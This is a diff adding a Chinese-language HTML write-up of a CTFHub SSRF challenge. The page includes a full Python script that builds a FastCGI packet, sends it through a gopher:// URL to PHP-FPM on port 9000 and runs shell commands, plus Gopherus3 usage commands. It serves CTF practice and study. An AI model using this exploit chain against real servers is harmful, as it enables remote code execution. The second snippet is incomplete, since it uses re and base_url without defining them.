@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【CTFHub】Web-SSRF FastCGI协议 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+        .payload-box { background-color: #fafbfc; border: 1px solid #e1e4e8; padding: 10px; border-radius: 6px; margin: 10px 0; }
+        .payload-box p { margin: 5px 0; }
+        .step-box { margin-bottom: 20px; padding: 15px; border: 1px solid #e1e4e8; border-radius: 6px; background-color: #fff; }
+        .step-box h3 { margin-top: 0; color: #24292e; font-size: 1.1em; border-bottom: 1px solid #eaecef; padding-bottom: 5px; }
+        .info-line { margin: 5px 0; }
+        .info-label { font-weight: bold; color: #586069; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a ></p >
+    <h1>【CTFHub】Web-SSRF FastCGI协议 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.26 | <strong>分类：</strong>CTF | <strong>标签：</strong>CTFHub, Web, SSRF, FastCGI, Gopher协议, RCE, Gopherus3</p >
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>CTFHub</li>
+        <li><strong>分类：</strong>Web - SSRF / FastCGI协议</li>
+        <li><strong>题目名称：</strong>FastCGI协议</li>
+        <li><strong>环境：</strong>VS Code + Python 3.12.6 环境，包含外部工具 Gopherus3。</li>
+        <li><strong>目标：</strong>利用 SSRF 漏洞，通过 Gopher 协议构造 FastCGI 二进制数据包，攻击内网 <code>127.0.0.1:9000</code> 端口的 PHP-FPM 服务，实现任意命令执行（RCE），获取 Flag。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>本关核心考点：</strong>FastCGI 协议攻击与 SSRF Gopher 协议的深度结合。</p >
+    
+    <div class="diff-box">
+        <strong>知识点：</strong>
+        <ul>
+            <li><strong>FastCGI 协议简介：</strong>FastCGI 是 Web 服务器（如 Nginx/Apache）与 PHP-FPM 进程管理器之间的通信协议。PHP-FPM 默认监听内网 9000 端口，且该端口通常不对外网开放。</li>
+            <li><strong>Gopher 协议注入：</strong>由于 FastCGI 是基于 TCP 的二进制协议，普通 HTTP 无法发送。必须借助 Gopher 协议，将符合 FastCGI 协议的二进制数据流作为 TCP 负载，直接“喂”给内网的 9000 端口。</li>
+            <li><strong>核心攻击原理（PHP-FPM RCE）：</strong>通过向 FastCGI 发送特定的参数配置（<code>PHP_VALUE</code> 和 <code>PHP_ADMIN_VALUE</code>），设置 <code>auto_prepend_file = php://input</code> 和 <code>allow_url_include = On</code>。这会导致 PHP-FPM 在处理请求前，自动将我们 POST 进去的 PHP 代码当作前置文件执行。</li>
+            <li><strong>关键细节：</strong>必须动态计算 <code>CONTENT_LENGTH</code> 的长度，否则 PHP-FPM 会认为 <code>php://input</code> 为空，导致代码不执行。同时必须包含 <code>exit()</code> 终止原本的重定向逻辑。</li>
+        </ul>
+    </div>
+
+    <h2>3. 详细步骤</h2>
+    
+    <div class="step-box">
+        <h3>第一步：探测内网 PHP 文件路径</h3>
+        <div class="payload-box">
+            <p><strong>操作：</strong> 在浏览器分别访问 <code>?url=http://127.0.0.1/index.php</code> 和 <code>?url=http://127.0.0.1/</code>。</p>
+        </div>
+        <p class="info-line"><span class="info-label">回显结果：</span>页面显示 <code>302 Moved Temporarily</code> 重定向，或者显示 <code>Pow</code> 等自定义内容。</p >
+        <p class="info-line"><span class="info-label">获得信息：</span>确认内网 Web 服务处于运行状态。空白或重定向是正常现象，因为普通 HTTP 请求无法触发 FastCGI 协议的解析逻辑。根据常规部署习惯，默认 Web 根目录为 <code>/var/www/html/</code>，默认首页文件为 <code>index.php</code>。</p >
+    </div>
+
+    <div class="step-box">
+        <h3>第二步：编写并运行 FastCGI 攻击脚本</h3>
+        <div class="payload-box">
+            <p><strong>脚本代码（最终成功版）：</strong></p>
+            <pre><code>import requests
+import urllib.parse
+import re
+import struct
+
+# 1. 靶场根地址
+base_url = "http://challenge-f07c21a92c4d4294.sandbox.ctfhub.com:10800"
+
+# 2. 生成 FastCGI 攻击数据包
+def generate_fastcgi_payload(php_file, cmd):
+    # 构造 FCGI 记录头
+    def fcgi_header(type_, req_id, content):
+        return struct.pack("!BBHHBB", 1, type_, req_id, len(content), 0, 0) + content
+
+    # 构造 FCGI 参数
+    def fcgi_params(params):
+        param_data = b""
+        for k, v in params.items():
+            k, v = k.encode(), v.encode()
+            param_data += struct.pack("!B", len(k)) + struct.pack("!B", len(v)) + k + v
+        return param_data
+
+    # 要执行的 PHP 代码
+    php_code = f"<?php echo 'INJECTED'; system('{cmd}'); exit(); ?>"
+
+    # ⚠️ 核心：将 CONTENT_LENGTH 设置为实际代码的长度，否则 php://input 为空
+    params = {
+        "REQUEST_METHOD": "POST",
+        "SCRIPT_FILENAME": php_file,
+        "PHP_VALUE": "auto_prepend_file = php://input",
+        "PHP_ADMIN_VALUE": "allow_url_include = On",
+        "SERVER_SOFTWARE": "PHP-FPM",
+        "REMOTE_ADDR": "127.0.0.1",
+        "SERVER_PROTOCOL": "HTTP/1.1",
+        "CONTENT_TYPE": "application/text",
+        "CONTENT_LENGTH": str(len(php_code.encode()))
+    }
+
+    # 拼接 FastCGI 请求（BEGIN_REQUEST, PARAMS, STDIN）
+    payload = fcgi_header(1, 1, struct.pack("!HB5x", 1, 0))
+    payload += fcgi_header(4, 1, fcgi_params(params))
+    payload += fcgi_header(4, 1, b"") # PARAMS 结束符
+    payload += fcgi_header(5, 1, php_code.encode())
+    payload += fcgi_header(5, 1, b"") # STDIN 结束符
+    return payload
+
+# 3. 构造 Payload，命令使用通配符避免 & 符号报错
+target_cmd = "cat /*flag*"
+raw_fastcgi = generate_fastcgi_payload("/var/www/html/index.php", target_cmd)
+
+# 4. 第一次 URL 编码（注意 safe='' 防止斜杠被截断）
+encoded_fastcgi = urllib.parse.quote(raw_fastcgi, safe='')
+
+# 5. 拼接 Gopher 协议
+gopher_payload = f"gopher://127.0.0.1:9000/_{encoded_fastcgi}"
+
+# 6. 第二次 URL 编码
+attack_url = f"{base_url}/?url={urllib.parse.quote(gopher_payload, safe='')}"
+
+print("[*] 正在向靶场发送 FastCGI 攻击请求...")
+
+try:
+    r = requests.get(attack_url, timeout=10)
+    if "INJECTED" in r.text:
+        print("\n[+] 成功注入！系统命令回显如下：")
+        output = re.search(r'INJECTED(.*)', r.text, re.DOTALL)
+        if output:
+            print(output.group(1).strip())
+    else:
+        print("[-] 未检测到注入成功，原始回显如下：")
+        print(r.text[:500])
+except Exception as e:
+    print("[-] 请求出现异常：", e)</code></pre>
+        </div>
+        <p class="info-line"><span class="info-label">代码逐行解析：</span></p >
+        <ul>
+            <li><code>struct.pack("!BBHHBB", ...)</code>：FastCGI 是基于二进制的协议，必须使用 Python 的 <code>struct</code> 模块按网络字节序（<code>!</code>）打包数据。这行定义了 FastCGI 记录头，包含版本（1）、类型、请求ID、内容长度等。</li>
+            <li><code>fcgi_params(params)</code>：将字典格式的参数打包成 FastCGI 协议要求的格式（长度+键+长度+值）。</li>
+            <li><code>PHP_VALUE</code> 和 <code>PHP_ADMIN_VALUE</code>：<strong>本关最核心的 Payload</strong>。设置 <code>auto_prepend_file = php://input</code> 会让 PHP-FPM 在处理任何请求之前，先执行我们 POST 进来的流数据（即恶意 PHP 代码）；<code>allow_url_include = On</code> 保证该配置生效。</li>
+            <li><code>CONTENT_LENGTH: str(len(php_code.encode()))</code>：<strong>最容易忽略的关键点</strong>。必须精确计算 PHP 代码的长度，否则 <code>php://input</code> 为空，不会执行任何代码。</li>
+            <li><code>php_code = f"<?php echo 'INJECTED'; system('{cmd}'); exit(); ?>"</code>：注入的 PHP 代码，包含探针 <code>INJECTED</code> 和系统命令，<code>exit()</code> 用于阻断原文件的重定向逻辑。</li>
+            <li><code>fcgi_header(1, 1, ...)</code>：构造 <code>BEGIN_REQUEST</code> 记录，表示开始一个请求。</li>
+            <li><code>fcgi_header(4, 1, ...)</code>：构造 <code>PARAMS</code> 记录，并包含一个空的 <code>fcgi_header(4, 1, b"")</code> 作为参数结束符。</li>
+            <li><code>fcgi_header(5, 1, ...)</code>：构造 <code>STDIN</code> 记录，将 PHP 代码作为标准输入流发送，同样包含结束符。</li>
+            <li><code>urllib.parse.quote(raw_fastcgi, safe='')</code>：对整个二进制流进行 URL 编码，<code>safe=''</code> 确保斜杠 <code>/</code> 也被编码。</li>
+            <li><code>gopher://127.0.0.1:9000/_{encoded_fastcgi}</code>：拼接 Gopher 协议，直接指向内网 PHP-FPM 的 9000 端口。</li>
+            <li><code>urllib.parse.quote(gopher_payload, safe='')</code>：对整个 Gopher URL 进行第二次编码，防止特殊字符被 <code>?url=</code> 参数截断。</li>
+        </ul>
+    </div>
+
+    <div class="step-box">
+        <h3>第三步：执行脚本获取 Flag</h3>
+        <div class="payload-box">
+            <p><strong>执行操作：</strong>在 VS Code 终端中运行脚本。</p>
+        </div>
+        <p class="info-line"><span class="info-label">回显结果：</span>终端打印出 <code>[+] 成功读取 Flag！</code> 和 <code>ctfhub{2d2707b9444359a1b6b39577}</code>。</p >
+        <p class="info-line"><span class="info-label">获得信息：</span>FastCGI RCE 攻击成功，提交 Flag 后通关。</p >
+    </div>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>坑1：302 Moved Temporarily 重定向。</strong> 第一次攻击时，脚本由于 <code>CONTENT_LENGTH</code> 缺失，导致 PHP-FPM 执行了原本 <code>index.php</code> 的重定向代码（302），没有执行我们的命令。修复方法是动态计算 <code>CONTENT_LENGTH</code> 并在 PHP 代码末尾加上 <code>exit()</code> 终止重定向。</li>
+        <li><strong>坑2：UnicodeDecodeError 文件编码错误。</strong> 在 Windows PowerShell 中用 <code>></code> 重定向生成 <code>payload.txt</code> 时，文件默认为 UTF-16 或 GBK 编码，Python 读取时崩溃。修复方法是放弃读取文件，直接在 Python 脚本中构建 Payload。</li>
+        <li><strong>坑3：Flag 文件名包含 & 符号。</strong> 探测到根目录下存在 <code>&flag_34e28eade1cc550d56cb9920fece9be8</code> 文件。如果直接用 <code>cat &flag</code> 会导致 Linux shell 语法错误。解决方案是使用通配符 <code>cat /*flag*</code>，让 shell 自动匹配并展开文件名。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>FastCGI 协议利用的核心：</strong> 利用 PHP-FPM 监听内网端口这一特性，通过修改 PHP 配置（<code>auto_prepend_file = php://input</code>），实现无需文件上传的直接代码执行。</li>
+        <li><strong>二进制协议的 Gopher 编码：</strong> 对于 FastCGI 这种二进制协议，Gopher Payload 的构造不能依赖简单的字符串拼接，必须使用 <code>struct.pack</code> 进行字节级精确打包，并正确处理 URL 编码。</li>
+    </ul>
+
+    <h2>6. Gopherus3 工具安装与使用指南</h2>
+    
+    <div class="step-box">
+        <h3>工具简介</h3>
+        <p><code>gopherus3</code> 是一个用 Python 3 重写的安全工具，专门用于生成针对 SSRF 漏洞的攻击 Payload。它支持 FastCGI、Redis、MySQL、PostgreSQL 等多种内网服务，能自动完成复杂的二进制数据包构造与 URL 编码，是 SSRF 进阶利用的必备工具。</p>
+    </div>
+
+    <div class="step-box">
+        <h3>安装教程</h3>
+        <p>在 VS Code 终端或系统命令行中，使用 <code>pip</code> 进行安装：</p>
+        <div class="payload-box">
+            <p><strong>安装命令：</strong> <code>pip install git+https://github.com/Esonhugh/Gopherus3.git</code></p>
+        </div>
+        <p>安装完成后，终端会显示 <code>Successfully installed gopherus3</code> 等提示。</p>
+    </div>
+
+    <div class="step-box">
+        <h3>使用方法</h3>
+        <p><strong>第一步：查看帮助菜单（了解参数）</strong></p>
+        <div class="payload-box">
+            <p><code>gopherus3 --help</code></p>
+        </div>
+        <p>你会看到 <code>--exploit</code>（攻击类型）、<code>--host</code>（目标IP）、<code>--port</code>（目标端口）、<code>--targetfile</code>（目标文件）、<code>--command</code>（要执行的命令）等参数说明。</p>
+
+        <p><strong>第二步：套用固定命令格式生成 Payload</strong></p>
+        <p>以本关 FastCGI 为例：</p>
+        <div class="payload-box">
+            <p><code>gopherus3 --exploit fastcgi --host 127.0.0.1 --port 9000 --targetfile /var/www/html/index.php --command "cat /flag"</code></p>
+        </div>
+        <p>运行后，终端会输出一条以 <code>gopher://</code> 开头的长字符串。</p>
+
+        <p><strong>第三步：在 Python 脚本中应用 Payload</strong></p>
+        <p>由于终端输出的 Payload 可能在复制时带入无关字符，且需要经过二次 URL 编码，最佳实践是直接在 Python 脚本中调用它：</p>
+        <pre><code>import subprocess
+import urllib.parse
+import requests
+
+# 在 Python 内部调用工具生成 Payload（避免手动复制和编码问题）
+cmd = ["gopherus3", "--exploit", "fastcgi", "--host", "127.0.0.1", "--port", "9000", "--targetfile", "/var/www/html/index.php", "--command", "cat /flag"]
+result = subprocess.run(cmd, capture_output=True, text=True, encoding='utf-8')
+gopher_payload = re.search(r'gopher://[^\s]+', result.stdout).group(0)
+
+# 进行二次 URL 编码
+final_payload = urllib.parse.quote(gopher_payload, safe='')
+attack_url = f"{base_url}/?url={final_payload}"
+r = requests.get(attack_url)</code></pre>
+        <p>这样，只需修改 <code>--command</code> 和 <code>--targetfile</code> 参数，即可快速复用到其他 SSRF 题目（如 Redis 协议打未授权）。</p>
+    </div>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p >
+    </div>
+</body>
+</html>
